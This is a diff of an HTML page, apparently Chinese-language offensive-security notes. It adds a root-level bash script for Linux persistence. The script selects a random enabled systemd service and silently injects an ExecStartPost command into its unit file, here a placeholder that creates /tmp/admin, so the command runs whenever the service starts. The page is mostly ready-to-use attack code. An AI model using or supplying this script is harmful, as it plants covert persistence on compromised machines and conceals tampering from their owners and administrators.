@@ -53,4 +53,37 @@ alias后门</p></div></div></div><div class="el-h3 heading-wrapper"><h3 data-hea
 <span class="token keyword">else</span>
     <span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$PORT</span> close"</span>
 <span class="token keyword">fi</span>
+</code><button class="copy-code-button">复制</button></pre></div><div class="el-p"><p dir="auto">系统服务权限维持，需要root权限</p></div><div class="el-pre"><pre class="language-bash" tabindex="0"><code data-line="0" class="language-bash is-loaded"><span class="token shebang important">#!/bin/bash</span>
+
+<span class="token comment"># 获取所有开机自启的服务</span>
+<span class="token assign-left variable">services</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span>systemctl list-unit-files --type<span class="token operator">=</span>service --state<span class="token operator">=</span>enabled <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'{print $1}'</span> <span class="token operator">|</span> <span class="token function">grep</span> -v <span class="token string">'^$'</span><span class="token variable">)</span></span>
+
+<span class="token comment"># 将服务转换为数组</span>
+<span class="token assign-left variable">service_array</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token variable">$services</span><span class="token punctuation">)</span>
+
+<span class="token comment"># 检查是否有可用的服务</span>
+<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable">${<span class="token operator">#</span>service_array<span class="token punctuation">[</span>@<span class="token punctuation">]</span>}</span> -eq <span class="token number">0</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>
+    <span class="token builtin class-name">echo</span> <span class="token string">"system enable service not found"</span>
+    <span class="token builtin class-name">exit</span> <span class="token number">1</span>
+<span class="token keyword">fi</span>
+
+<span class="token comment"># 随机选择一个服务</span>
+<span class="token assign-left variable">random_service</span><span class="token operator">=</span><span class="token variable">${service_array<span class="token punctuation">[</span>RANDOM <span class="token operator">%</span> ${<span class="token operator">#</span>service_array<span class="token punctuation">[</span>@<span class="token punctuation">]</span>}</span><span class="token punctuation">]</span><span class="token punctuation">}</span>
+
+<span class="token comment"># 获取服务的单位文件路径</span>
+<span class="token assign-left variable">unit_file_path</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span>systemctl show -p FragmentPath <span class="token string">"<span class="token variable">$random_service</span>"</span> <span class="token operator">|</span> <span class="token function">cut</span> -d<span class="token string">'='</span> -f2<span class="token variable">)</span></span>
+
+<span class="token comment"># 检查单位文件是否存在</span>
+<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token operator">!</span> -f <span class="token string">"<span class="token variable">$unit_file_path</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>
+    <span class="token builtin class-name">echo</span> <span class="token string">"service <span class="token variable">$random_service</span>'s file path not found"</span>
+    <span class="token builtin class-name">echo</span> <span class="token string">"please try again"</span>
+    <span class="token builtin class-name">exit</span> <span class="token number">1</span>
+<span class="token keyword">fi</span>
+
+<span class="token comment"># 在 ExecStart 的下一行插入 echo 123</span>
+<span class="token function">sed</span> -i <span class="token string">"/^ExecStart=/a ExecStartPost=-/bin/bash -c 'touch /tmp/admin'"</span> <span class="token string">"<span class="token variable">$unit_file_path</span>"</span>
+
+<span class="token comment"># 输出结果</span>
+<span class="token builtin class-name">echo</span> <span class="token string">"service file path: <span class="token variable">$unit_file_path</span>"</span>
+<span class="token builtin class-name">echo</span> <span class="token string">"add ExecStartPost in <span class="token variable">$random_service</span> success"</span>
 </code><button class="copy-code-button">复制</button></pre></div><div class="mod-footer mod-ui"></div></div></div></div></div></body></html>
